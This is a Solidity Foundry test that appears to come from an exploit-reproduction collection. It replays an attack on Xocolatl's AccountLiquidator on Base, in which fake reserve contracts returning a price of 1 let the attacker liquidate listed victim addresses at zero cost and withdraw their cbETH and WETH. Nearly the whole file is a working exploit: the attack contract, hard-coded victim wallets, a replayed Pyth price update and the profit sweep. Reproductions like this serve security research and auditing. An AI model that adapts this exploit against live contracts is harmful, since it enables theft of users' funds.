// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 3.25 cbETH and 0.22 WETH
// Attacker : 0xdb731450e065ea7f6bef6d27e88dd07d6e2d1af5
// Attack Contract : 0xcd2b07c193720d932ecda7490aa636bc8de4bfca
// Vulnerable Contract : 0xeab948ec7ce3f403b63787ba3884aaf43d07ca9c
// Victim : Xocolatl HouseOfReserve vault accounting users
// Attack Tx : https://basescan.org/tx/0x950f32324039be29007b158c321edf58c0b6742b01ba8d31a8b9a198a1dbbb4c

// @Info
// Vulnerable Contract Code : https://base.blockscout.com/address/0xeab948ec7ce3f403b63787ba3884aaf43d07ca9c#code

// @Analysis
// Social : https://t.me/defimon_alerts/2834
// Reference : https://github.com/La-DAO/xocolatl-contracts/blob/10c68fb1bfd41196359bf35b8e0fb97a305898f2/contracts/AccountLiquidator.sol
//
// AccountLiquidator.liquidateUser trusted an arbitrary caller-supplied HouseOfReserve. The attacker supplied fake
// reserves that pointed at the real reserve accounting token IDs while returning a price that rounded the liquidation
// cost to zero. The liquidator transferred victims' accounting collateral to the attacker, then the attacker withdrew
// the seized cbETH and WETH from the real reserve vaults.

address constant ATTACKER = 0xdB731450e065ea7f6Bef6d27e88Dd07D6E2d1AF5;
address constant ACCOUNT_LIQUIDATOR_PROXY = 0x4b75Fb5B0D323672fc6Eac5Afbf487AE4c2ff6de;
address constant ASSETS_ACCOUNTANT = 0xB93EcD005B6053c6F8428645aAA879e7028408C7;
address constant PYTH = 0x8250f4aF4B972684F7b336503E2D6dFeDeB1487a;
address constant CBETH_RESERVE = 0x5c4a154690AE52844F151bcF3aA44885db3c8A58;
address constant WETH_RESERVE = 0xfF69E183A863151B4152055974aa648b3165014D;
address constant CBETH = 0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22;
address constant WETH_TOKEN = 0x4200000000000000000000000000000000000006;

uint256 constant CBETH_RESERVE_TOKEN_ID =
    0x6b4ddebf5c8f95cd67604d703cf468f2878553e73b3fb19d5f21a705279b97cc;
uint256 constant CBETH_BACKED_TOKEN_ID =
    0xfbaf37452f3a44364bfde67db21cb53aa66303780154e7c4ea8f5af2abecfdb9;
uint256 constant WETH_RESERVE_TOKEN_ID =
    0xe543a7b7b92732eb97bcc8d6dd925998e34694b07fbaa4f9ba313b260473fa1d;
uint256 constant WETH_BACKED_TOKEN_ID =
    0x138e1f20a5754931001cc95e3eb6b8b1a5a70ea84981a0253f6053d13a7d533a;

interface IAccountLiquidator {
    function liquidateUser(address userToLiquidate, address houseOfReserve) external;
}

interface IAssetsAccountant {
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

interface IHouseOfReserve {
    function withdraw(uint256 amount) external;
}

interface IPyth {
    function getUpdateFee(bytes[] calldata updateData) external view returns (uint256);
    function updatePriceFeeds(bytes[] calldata updateData) external payable;
}

contract ContractTest is BaseTestWithBalanceLog {
    uint256 private constant FORK_BLOCK = 43_801_482;
    uint256 private constant MIN_CBETH_PROFIT = 3 ether;
    uint256 private constant MIN_WETH_PROFIT = 0.2 ether;

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        fundingToken = CBETH;
        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(CBETH);
        _addFundingToken(WETH_TOKEN);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ACCOUNT_LIQUIDATOR_PROXY, "AccountLiquidator proxy");
        vm.label(ASSETS_ACCOUNTANT, "AssetsAccountant");
        vm.label(PYTH, "Pyth");
        vm.label(CBETH, "cbETH");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(CBETH_RESERVE, "cbETH HouseOfReserve");
        vm.label(WETH_RESERVE, "WETH HouseOfReserve");
    }

    function testExploit() public balanceLog {
        uint256 cbEthBefore = IERC20(CBETH).balanceOf(ATTACKER);
        uint256 wethBefore = IERC20(WETH_TOKEN).balanceOf(ATTACKER);

        XocolatlLiquidationAttack attack = new XocolatlLiquidationAttack(ATTACKER);
        vm.deal(address(attack), 0.001 ether);

        // step 1: run the fake-reserve liquidation loop and withdraw the seized reserve assets.
        attack.execute();

        uint256 cbEthProfit = IERC20(CBETH).balanceOf(ATTACKER) - cbEthBefore;
        uint256 wethProfit = IERC20(WETH_TOKEN).balanceOf(ATTACKER) - wethBefore;
        logTokenBalance(CBETH, ATTACKER, "Attacker cbETH profit");
        logTokenBalance(WETH_TOKEN, ATTACKER, "Attacker WETH profit");

        assertGt(cbEthProfit, MIN_CBETH_PROFIT, "cbETH profit");
        assertGt(wethProfit, MIN_WETH_PROFIT, "WETH profit");
    }
}

contract XocolatlLiquidationAttack {
    IAccountLiquidator private constant liquidator = IAccountLiquidator(ACCOUNT_LIQUIDATOR_PROXY);
    IAssetsAccountant private constant accountant = IAssetsAccountant(ASSETS_ACCOUNTANT);
    IPyth private constant pyth = IPyth(PYTH);
    address private immutable profitReceiver;

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    receive() external payable {}

    function execute() external {
        // step 1: publish the signed Pyth price update used by the trace so real vault withdrawals are not stale.
        bytes[] memory updateData = new bytes[](1);
        updateData[0] = pythPriceUpdate();
        uint256 updateFee = pyth.getUpdateFee(updateData);
        pyth.updatePriceFeeds{value: updateFee}(updateData);

        // step 2: use a fake cbETH reserve to move victims' cbETH accounting collateral to this contract.
        FakeHouseOfReserve fakeCbEthReserve =
            new FakeHouseOfReserve(CBETH, CBETH_RESERVE_TOKEN_ID, CBETH_BACKED_TOKEN_ID);
        drainCbEthVictims(address(fakeCbEthReserve));
        IHouseOfReserve(CBETH_RESERVE).withdraw(accountant.balanceOf(address(this), CBETH_RESERVE_TOKEN_ID));

        // step 3: repeat the same fake-reserve liquidation path for WETH accounting collateral.
        FakeHouseOfReserve fakeWethReserve =
            new FakeHouseOfReserve(WETH_TOKEN, WETH_RESERVE_TOKEN_ID, WETH_BACKED_TOKEN_ID);
        drainWethVictims(address(fakeWethReserve));
        IHouseOfReserve(WETH_RESERVE).withdraw(accountant.balanceOf(address(this), WETH_RESERVE_TOKEN_ID));

        // step 4: forward the extracted assets and leftover native token to the trace profit receiver.
        sweepToken(CBETH);
        sweepToken(WETH_TOKEN);
        if (address(this).balance > 0) {
            payable(profitReceiver).transfer(address(this).balance);
        }
    }

    function drainCbEthVictims(address fakeReserve) private {
        address[5] memory victims = [
            0xEA7D443EcB40E2189d674256DfF3CC32b35C1430,
            0x0B438De1DCa9FBa6D14F17c1F0969ECc73C8186F,
            0x1019236722517506732D92DAc0f7b9B4ed993D8d,
            0x03397CabEAc33EE8FE3Eb79219Df7161C414dF4B,
            0xc4DFf23F4e560f9D81C4866e5fb7124C447E23CA
        ];
        drainVictims(victims, fakeReserve, CBETH_RESERVE_TOKEN_ID);
    }

    function drainWethVictims(address fakeReserve) private {
        address[12] memory victims = [
            0xF54f4815f62ccC360963329789d62d3497A121Ae,
            0x00172237AA2BC7713878f2b8F2Ec2fC39648f9F4,
            0xEA7D443EcB40E2189d674256DfF3CC32b35C1430,
            0x2aa64388b7654389C61C2145CAE22816B4f2B760,
            0x96053204967c30079529ADddC56f6a37380205aF,
            0x1544671CB178AB9F6fD56841B4464e00311801d8,
            0x358E25cd4d7631eB874D25F4e1Ae4a14B0abb56E,
            0xae3355308c4f4B7CcFe04B4568e571057890288e,
            0x03397CabEAc33EE8FE3Eb79219Df7161C414dF4B,
            0x9c77c6fafc1eb0821F1De12972Ef0199C97C6e45,
            0xEC08EfF77496601BE56c11028A516366DbF03F13,
            0xC863DFEE737C803c93aF4b6b27029294f6a56eB5
        ];
        drainVictims(victims, fakeReserve, WETH_RESERVE_TOKEN_ID);
    }

    function drainVictims(address[5] memory victims, address fakeReserve, uint256 reserveTokenID) private {
        for (uint256 i; i < victims.length; ++i) {
            runFourLiquidations(victims[i], fakeReserve, reserveTokenID);
        }
    }

    function drainVictims(address[12] memory victims, address fakeReserve, uint256 reserveTokenID) private {
        for (uint256 i; i < victims.length; ++i) {
            runFourLiquidations(victims[i], fakeReserve, reserveTokenID);
        }
    }

    function runFourLiquidations(address victim, address fakeReserve, uint256 reserveTokenID) private {
        for (uint256 i; i < 4; ++i) {
            if (accountant.balanceOf(victim, reserveTokenID) == 0) {
                break;
            }
            liquidator.liquidateUser(victim, fakeReserve);
        }
    }

    function sweepToken(address token) private {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(profitReceiver, balance);
        }
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    function pythPriceUpdate() private pure returns (bytes memory) {
        // Signed Pyth VAA from the trace. The oracle contract requires this opaque byte payload.
        return bytes.concat(
            hex"504e41550100000003b801000000050d004d659ba9470b0bdaa3117bc81690746630eb2032d43e2d620ee70ae3d4cf19e7628954a9cdb0aa01d757116ea67beb89f187b6df34bcca9b4188a2aa98f4a7",
            hex"c601033474a9925dbd854cae24a54b8a48bb527682ff3ac013d04f42fd75c413c0900e1cd16487b924849a604187ea49db5bc28bfbd8bcb073a0ed99fc4a9ddea918ea00043e302b5f479087e08d5dce",
            hex"353e992157d07d5d1eb763185f006dad23ce778cf11cedb132c7b234ae95de7ff08c1924f7c68e79a29314c3e193dde8e85ebf1c8400063100d0cf4834cef53ae13c61e080380eb418c424b629cb3b9e",
            hex"6ba51b6f7ae30346edd942d29878fa29fa99eae3aa8cece8055aa149189e6f87496eba5752987400079405ec1b0152a008e5c4eb0b4bb95cca30093f3ac864acc486ae7fecff2e6b04684b80a78e073f",
            hex"3df9b7ac415175ed049488e5561b86a21d5a035de9f3bcef150008a60ef9c11e7e0b0d67ba092fa5728da4660ddf159698b5b9362415f4b378304537c588a2b3b36f5f55f565aa11944257422d996a18",
            hex"7fd3048cd270bd68a5c5f10009b8386278bd9528e760f5271fe348c4977c9bae619a73e5b6d98579237e830bf41d0cd0c1858c03ff9ea1bb4b79e723ef59073883c562902adfc51d4611ae5459000a2c",
            hex"79f0b40821d32b02b336f5e067c5a80f1a95783261cc94a5887cd5dc07efdb0b2775fea5c69723d5e5b8e616a22e8addf7bd8d5764a62ca0bffa7c47d8a4d9000cfd207eae5daf3a98a74f717bd8947e",
            hex"47450175e54efdcece319ee821e04929646dd1c87cd02bd42811f2159243ac7f78846fba2718957755eb5f78da7a2bf93a000decf32b7d2fad464c58c87da55ca212044fdef9d5abfb60c25b152c9590",
            hex"04902f655be2d8f34c02eeada41787cc2ff15370f00ae41a158a316adb8d07ad9d975f010e02f670742b66b5340f7590e79967954f6ba2a8dfa3b780ff30c35b5d3819454e69d027907407205732485e",
            hex"40241ab10224fe478728954ebf48f25697b1b30745010f48a1479593939136abe165a3082587df640c478219f19cdb83d933681b9cf57c20bc76007b370f4fdfbb00c07b7f9a3eaf4a2e25ece56ecc2b",
            hex"eb535adfabe7ab01104ef05212b6aca5f22119eab0c4b9cf1313de6ef1cdaeecad74b1e985df943fbb6869ff992a1b64f7cc9964a0fcf1768339e32a2797786b2b56570adc445ba8090169c312790000",
            hex"0000001ae101faedac5851e32b9b23b5f9411a8c2bac4aae3ed4dd7b811dd1a72ea4aa71000000000bae0d630141555756000000000010bbb695000027109e39ad4f28eb3a04142af9adad21933bf435",
            hex"2fcb01005500e13b1c1ffb32f34e1be9545583f01ef385fde7f42ee66049d30570dc866b77ca00000000001b12d900000000000003cbfffffffb0000000069c312790000000069c3127900000000001b",
            hex"12b600000000000003110d01e74ad0409ef3f710e45222024b62107a476faa0842c7d837f9be9df6f82c7ed81efeb16f488a5a6faf8bf6b522afe284843c1abf523671fe937f81937629d611d910b09d",
            hex"e441472e3613fca447634db190a3e45742a088f309108d5c600fa83439e06fbf8d3fc7a945dd8dc28e1609978dbe9b1c2e3dd3f07bd6ee73dd221f356a7c65124e51c8a833f9a5ce25bfe5d6290df996",
            hex"bb42b2c5b69a3723fabd95332e030f077d8056f1ddaf2ea706c18c70be2c4d3c19a15515254b29a3c8f5351ae0b6197ca29446cb73aaa78045ef9bd44ed64813f496a30a2eee3c7e722a4e2aff75e7b5",
            hex"4ac8a1697987c3110c940ffbf08319d003d22d9bd0c17fb8911c997e813654"
        );
    }
}

contract FakeHouseOfReserve {
    address public immutable reserveAsset;
    uint256 public immutable reserveTokenID;
    uint256 public immutable backedTokenID;

    constructor(address reserveAsset_, uint256 reserveTokenID_, uint256 backedTokenID_) {
        reserveAsset = reserveAsset_;
        reserveTokenID = reserveTokenID_;
        backedTokenID = backedTokenID_;
    }

    function getLatestPrice() external pure returns (uint256) {
        // Trace fake reserves returned 1, making AccountLiquidator's discounted price round to zero.
        return 1;
    }

    function liquidationFactor() external pure returns (uint256) {
        // Trace fake reserves returned 1; health still falls below threshold because the fake price is near zero.
        return 1;
    }
}
